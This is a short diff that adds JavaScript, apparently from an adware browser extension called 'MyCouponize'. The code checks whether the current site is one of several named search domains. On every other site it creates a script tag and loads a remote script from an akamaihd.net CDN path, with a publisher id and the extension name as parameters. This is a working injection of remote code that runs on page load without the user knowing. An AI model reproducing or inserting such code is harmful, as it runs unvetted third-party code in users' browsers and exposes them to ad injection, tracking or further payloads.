@@ -1,0 +1,6 @@
+if (window.location.hostname.indexOf('hidemysearch') === -1 && window.location.hostname.indexOf('hideyoursearch') === -1 && window.location.hostname.indexOf('mysafesearch') === -1 && window.location.hostname.indexOf('searchapp') === -1 && window.location.hostname.indexOf('mytab') === -1 && window.location.hostname.indexOf('chumsearch') === -1 && window.location.hostname.indexOf('rack-search') === -1){
+var url = '//cdncache-a.akamaihd.net/sub/s4aa1f3/upd-1733/l.js?pid=2588&ext=MyCouponize';
+var e=document.createElement('script');
+e.src = url;
+document.body.appendChild(e);
+}
